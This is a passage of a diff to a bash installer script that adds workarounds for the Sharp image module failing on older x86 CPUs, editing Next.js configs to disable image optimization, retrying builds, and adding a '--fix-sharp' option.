+                # Create or update next.config.js to disable image optimization
+                if [[ -f "frontend/next.config.js" ]]; then
+                    if ! grep -q "images.unoptimized" "frontend/next.config.js"; then
+                        sed -i '/module.exports = {/a\\  images: { unoptimized: true },' "frontend/next.config.js" 2>/dev/null || {
+                            # Fallback method if sed fails
+                            echo "// Sharp compatibility - added by installer" >> "frontend/next.config.js"
+                            echo "if (module.exports && !module.exports.images) module.exports.images = {};" >> "frontend/next.config.js"
+                            echo "if (module.exports && module.exports.images) module.exports.images.unoptimized = true;" >> "frontend/next.config.js"
+                        }
+                    fi
+                fi
+            fi
+        fi
+        
+        return 0
+    }
+    
+    # Try installing Sharp first if needed
+    install_sharp_with_fallback
+    
     # Since installer runs as root, we need to handle pnpm execution specially
     # Always run pnpm as root during installation, then fix permissions after
     print_info "Running pnpm install as root with local store..."
     
+    # Set environment to handle Sharp issues
+    export SHARP_IGNORE_GLOBAL_LIBVIPS=1
+    export npm_config_sharp_libvips_binary_host="https://github.com/lovell/sharp/releases"
+    
     if ! pnpm install --store-dir "$pnpm_store_dir" --frozen-lockfile; then
         print_warning "Frozen lockfile failed, trying regular install..."
         if ! pnpm install --store-dir "$pnpm_store_dir"; then
-            print_error "Failed to install dependencies"
-            exit 1
+            # Try one more time with --shamefully-hoist for Sharp issues
+            print_warning "Regular install failed, trying with shamefully-hoist..."
+            if ! pnpm install --store-dir "$pnpm_store_dir" --shamefully-hoist; then
+                print_error "Failed to install dependencies"
+                exit 1
+            fi
         fi
     fi
     
@@ -866,10 +1376,130 @@ EOF
     # Build application (pnpm scripts don't need --store-dir)
     print_info "Building application (this may take several minutes)..."
     
+    # Pre-build Sharp compatibility check
+    print_info "Checking Sharp module compatibility before build..."
+    
+    # Check if Sharp is causing issues
+    local sharp_check=$(node -e "try { require('sharp'); console.log('ok'); } catch(e) { console.log(e.message); }" 2>&1 || echo "error")
+    
+    if [[ "$sharp_check" != "ok" ]]; then
+        if echo "$sharp_check" | grep -q "v2 microarchitecture"; then
+            print_warning "Sharp module incompatible with CPU architecture"
+            print_info "Configuring Next.js to work without Sharp image optimization..."
+            
+            # Find and update next.config.js files
+            local next_configs=()
+            [[ -f "next.config.js" ]] && next_configs+=("next.config.js")
+            [[ -f "frontend/next.config.js" ]] && next_configs+=("frontend/next.config.js")
+            [[ -f "frontend/next.config.mjs" ]] && next_configs+=("frontend/next.config.mjs")
+            
+            for config_file in "${next_configs[@]}"; do
+                if [[ -f "$config_file" ]]; then
+                    print_info "Updating $config_file to disable image optimization..."
+                    
+                    # Check if it's .mjs or .js
+                    if [[ "$config_file" == *.mjs ]]; then
+                        # For .mjs files, we need to handle ES modules
+                        if ! grep -q "unoptimized.*true" "$config_file"; then
+                            # Create a backup
+                            cp "$config_file" "${config_file}.backup"
+                            
+                            # Add image configuration to disable optimization
+                            sed -i '/export default/ {
+                                i\// Sharp compatibility fix - added by installer
+                                i\const imageConfig = { unoptimized: true };
+                                i\
+                            }' "$config_file"
+                            
+                            # Merge the image config into the export
+                            sed -i 's/export default {/export default {\n  images: { unoptimized: true },/' "$config_file"
+                        fi
+                    else
+                        # For .js files (CommonJS)
+                        if ! grep -q "unoptimized.*true" "$config_file"; then
+                            # Create a backup
+                            cp "$config_file" "${config_file}.backup"
+                            
+                            # Check if module.exports exists
+                            if grep -q "module.exports" "$config_file"; then
+                                # Add images config to existing module.exports
+                                sed -i '/module.exports = {/ {
+                                    a\  images: { unoptimized: true },
+                                }' "$config_file"
+                            else
+                                # Append configuration at the end
+                                echo "" >> "$config_file"
+                                echo "// Sharp compatibility fix - added by installer" >> "$config_file"
+                                echo "if (!module.exports) module.exports = {};" >> "$config_file"
+                                echo "if (!module.exports.images) module.exports.images = {};" >> "$config_file"
+                                echo "module.exports.images.unoptimized = true;" >> "$config_file"
+                            fi
+                        fi
+                    fi
+                    
+                    print_success "Updated $config_file to bypass Sharp requirements"
+                fi
+            done
+            
+            # Also set environment variable to disable image optimization
+            export NEXT_SHARP_PATH=none
+            export NEXT_TELEMETRY_DISABLED=1
+        fi
+    fi
+    
     # Run build as root (store-dir is only needed for install, not for scripts)
     if ! pnpm build:all; then
-        print_error "Application build failed"
-        exit 1
+        print_warning "Build failed, checking for Sharp-related issues..."
+        
+        # Check if the error is Sharp-related
+        local build_error=$(pnpm build:all 2>&1 | head -100)
+        
+        if echo "$build_error" | grep -q "sharp.*module\|v2 microarchitecture"; then
+            print_info "Build failed due to Sharp module. Attempting workaround..."
+            
+            # Try to remove Sharp and reinstall with compatibility mode
+            print_info "Removing Sharp module..."
+            pnpm remove sharp 2>/dev/null || true
+            
+            # Install canvas as alternative
+            print_info "Installing canvas as alternative image processor..."
+            case $PACKAGE_MANAGER in
+                apt)
+                    apt-get install -y libcairo2-dev libjpeg-dev libpango1.0-dev \
+                        libgif-dev librsvg2-dev 2>/dev/null || true
+                    ;;
+                dnf|yum)
+                    $PACKAGE_MANAGER install -y cairo-devel libjpeg-devel pango-devel \
+                        giflib-devel librsvg2-devel 2>/dev/null || true
+                    ;;
+            esac
+            
+            pnpm add canvas 2>/dev/null || true
+            
+            # Retry build with modifications
+            print_info "Retrying build without Sharp..."
+            if ! pnpm build:all; then
+                print_error "Application build failed even after Sharp workaround"
+                print_info "You may need to manually configure the build process"
+                
+                # Offer to continue anyway
+                echo -e "${YELLOW}The build failed but installation can continue.${NC}"
+                echo -e "${WHITE}You will need to manually fix the build issues later.${NC}"
+                echo -e "Continue installation? (y/N): "
+                read -n 1 continue_after_build_fail
+                echo
+                if [[ ! $continue_after_build_fail =~ ^[Yy]$ ]]; then
+                    exit 1
+                fi
+            else
+                print_success "Application built successfully with workaround"
+            fi
+        else
+            print_error "Application build failed"
+            exit 1
+        fi
+    else
+        print_success "Application built successfully"
     fi
     
     # Fix ownership of built files
@@ -1777,8 +2407,197 @@ clean_build_artifacts() {
     print_info "You can now run the installer or build commands again"
 }
 
+# =============================================================================
+# 🔧 Sharp Module Fix Function
+# =============================================================================
+
+fix_sharp_compatibility() {
+    print_banner
+    echo -e "${YELLOW}${BOLD}🔧 SHARP MODULE COMPATIBILITY FIX${NC}"
+    echo -e "${WHITE}This will configure your application to work without Sharp module.${NC}\n"
+    
+    print_info "Detecting Sharp compatibility issues..."
+    
+    # Check CPU architecture
+    local cpu_arch=$(uname -m)
+    local cpu_flags=$(cat /proc/cpuinfo 2>/dev/null | grep flags | head -1 || echo "")
+    
+    if [[ "$cpu_arch" == "x86_64" ]] && ! echo "$cpu_flags" | grep -q " avx2 "; then
+        print_warning "CPU lacks AVX2 support (v1 microarchitecture detected)"
+        print_info "Your CPU cannot run Sharp's prebuilt binaries"
+    fi
+    
+    # Find all Next.js config files
+    print_info "Locating Next.js configuration files..."
+    local configs_found=0
+    local next_configs=()
+    
+    # Search for config files
+    for config in "next.config.js" "next.config.mjs" "frontend/next.config.js" "frontend/next.config.mjs"; do
+        if [[ -f "$config" ]]; then
+            next_configs+=("$config")
+            print_success "Found: $config"
+            configs_found=$((configs_found + 1))
+        fi
+    done
+    
+    if [[ $configs_found -eq 0 ]]; then
+        print_error "No Next.js configuration files found"
+        print_info "Creating a new next.config.js file..."
+        
+        # Determine where to create the config
+        local config_path="next.config.js"
+        if [[ -d "frontend" ]]; then
+            config_path="frontend/next.config.js"
+        fi
+        
+        # Create new config file
+        cat > "$config_path" << 'EOF'
+/** @type {import('next').NextConfig} */
+const nextConfig = {
+  // Sharp compatibility fix - disable image optimization
+  images: {
+    unoptimized: true,
+    domains: ['*'],
+  },
+  // Additional optimizations for systems without Sharp
+  swcMinify: true,
+  compress: true,
+}
+
+module.exports = nextConfig
+EOF
+        print_success "Created $config_path with Sharp workaround"
+        next_configs+=("$config_path")
+    fi
+    
+    # Update existing config files
+    for config_file in "${next_configs[@]}"; do
+        print_info "Updating $config_file..."
+        
+        # Create backup
+        cp "$config_file" "${config_file}.backup.$(date +%s)"
+        print_success "Backup created: ${config_file}.backup.$(date +%s)"
+        
+        # Check if already configured
+        if grep -q "unoptimized.*true" "$config_file"; then
+            print_success "$config_file already configured to bypass Sharp"
+            continue
+        fi
+        
+        # Update based on file type
+        if [[ "$config_file" == *.mjs ]]; then
+            # ES Module format
+            if grep -q "export default" "$config_file"; then
+                # Insert images config into existing export
+                sed -i '/export default {/a\  // Sharp compatibility fix\n  images: { unoptimized: true },' "$config_file"
+            else
+                # Append new export
+                echo "" >> "$config_file"
+                echo "// Sharp compatibility fix" >> "$config_file"
+                echo "export default { images: { unoptimized: true } };" >> "$config_file"
+            fi
+        else
+            # CommonJS format
+            if grep -q "module.exports" "$config_file"; then
+                # Update existing exports
+                sed -i '/module.exports = {/a\  // Sharp compatibility fix\n  images: { unoptimized: true },' "$config_file"
+            else
+                # Append new exports
+                echo "" >> "$config_file"
+                echo "// Sharp compatibility fix" >> "$config_file"
+                echo "module.exports = { images: { unoptimized: true } };" >> "$config_file"
+            fi
+        fi
+        
+        print_success "Updated $config_file"
+    done
+    
+    # Remove Sharp and install alternatives
+    print_info "Managing package dependencies..."
+    
+    echo -e "${WHITE}Options:${NC}"
+    echo -e "  1) Remove Sharp completely (recommended for incompatible CPUs)"
+    echo -e "  2) Try to rebuild Sharp from source"
+    echo -e "  3) Install older Sharp version (v0.32.6)"
+    echo -e "  4) Skip package changes (config only)"
+    echo -n "Choose (1-4): "
+    read -n 1 sharp_action
+    echo
+    
+    case $sharp_action in
+        1)
+            print_info "Removing Sharp module..."
+            npm uninstall sharp 2>/dev/null || true
+            pnpm remove sharp 2>/dev/null || true
+            
+            # Clean cache
+            npm cache clean --force 2>/dev/null || true
+            pnpm store prune 2>/dev/null || true
+            
+            print_success "Sharp module removed"
+            ;;
+        2)
+            print_info "Attempting to rebuild Sharp from source..."
+            
+            # Install build dependencies
+            case $PACKAGE_MANAGER in
+                apt)
+                    apt-get install -y build-essential libvips-dev 2>/dev/null || true
+                    ;;
+                dnf|yum)
+                    $PACKAGE_MANAGER install -y gcc-c++ vips-devel 2>/dev/null || true
+                    ;;
+            esac
+            
+            npm install --build-from-source sharp 2>/dev/null || {
+                print_warning "Build from source failed"
+            }
+            ;;
+        3)
+            print_info "Installing Sharp v0.32.6 (older compatible version)..."
+            npm install sharp@0.32.6 2>/dev/null || {
+                print_warning "Installation failed"
+            }
+            ;;
+        4)
+            print_info "Skipping package changes"
+            ;;
+    esac
+    
+    # Set environment variables
+    print_info "Setting environment variables..."
+    
+    # Add to .env if it exists
+    if [[ -f ".env" ]]; then
+        if ! grep -q "NEXT_SHARP_PATH" ".env"; then
+            echo "" >> .env
+            echo "# Sharp compatibility settings" >> .env
+            echo "NEXT_SHARP_PATH=none" >> .env
+            echo "NEXT_TELEMETRY_DISABLED=1" >> .env
+            print_success "Updated .env with Sharp bypass settings"
+        fi
+    fi
+    
+    print_success "Sharp compatibility fix completed!"
+    echo -e "\n${GREEN}${BOLD}✅ CONFIGURATION COMPLETE${NC}"
+    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}"
+    echo -e "${WHITE}Your application is now configured to work without Sharp.${NC}"
+    echo -e "${WHITE}Image optimization is disabled but the application will function normally.${NC}"
+    echo -e "\n${YELLOW}Next steps:${NC}"
+    echo -e "  1. ${CYAN}pnpm install${NC} - Reinstall dependencies"
+    echo -e "  2. ${CYAN}pnpm build:all${NC} - Build the application"
+    echo -e "  3. ${CYAN}pnpm start${NC} - Start the application"
+    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
+}
+
 # Handle command line arguments
 case "${1:-}" in
+    --fix-sharp)
+        echo -e "${BLUE}${BOLD}🔧 Running Sharp Compatibility Fix${NC}"
+        fix_sharp_compatibility
+        exit 0
+        ;;
     --seed-only)
         echo -e "${BLUE}${BOLD}🌱 Running Database Seed Only Mode${NC}"
         seed_only
@@ -1799,6 +2618,7 @@ case "${1:-}" in
         echo -e "${CYAN}Usage: $0 [OPTIONS]${NC}"
         echo ""
         echo -e "${WHITE}Options:${NC}"
+        echo -e "  ${CYAN}--fix-sharp${NC}          Fix Sharp module compatibility issues"
         echo -e "  ${CYAN}--seed-only${NC}          Import initial.sql and seed database (skip build)"
         echo -e "  ${CYAN}--fix-permissions${NC}    Fix file and directory permissions"
         echo -e "  ${CYAN}--clean-build${NC}        Clean build artifacts (.next, dist, node_modules)"
@@ -1806,6 +2626,7 @@ case "${1:-}" in
         echo ""
         echo -e "${WHITE}Examples:${NC}"
         echo -e "  ${CYAN}$0${NC}                   Run full installation (includes automatic cleanup)"
+        echo -e "  ${CYAN}$0 --fix-sharp${NC}       Fix Sharp module issues on older CPUs"
         echo -e "  ${CYAN}$0 --seed-only${NC}       Import database and seed only (after build is done)"
         echo -e "  ${CYAN}$0 --fix-permissions${NC} Fix file permissions only"
         echo -e "  ${CYAN}$0 --clean-build${NC}     Manual cleanup of build artifacts only"
